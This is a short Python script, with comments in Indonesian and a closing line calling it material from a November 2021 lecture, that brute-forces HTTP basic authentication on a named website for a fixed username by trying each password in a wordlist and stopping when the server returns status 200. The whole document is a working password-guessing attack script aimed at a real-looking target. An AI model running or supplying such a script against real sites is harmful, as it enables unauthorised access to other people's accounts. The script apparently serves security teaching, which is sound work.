import requests
import sys

url = "https://kotkit.com/"

def bruteforce(username,password):
    # autentikasi username dan password
    r = requests.get(url, auth=(username,password))
    # validasi jika status code 2000 maka password ditemukan
    if r.status_code == 200:
        print("Password found: ", password)
        sys.exit()
    else:
        print("-")

def main():
    with open("passwords.txt","rb") as file:
        #access file txt password untuk membaca setiap line untuk payload
        words = [w.strip() for w in file.readlines()]
        # masukkan ke dalam function nama user 
        # dan payload untuk mendapatkan passwordnya
        for payload in words:
            bruteforce("keket", payload)

if __name__ == "__main__":
    main()

# REFERENCE MATERIAL: Pertemuan Lec 4 November '21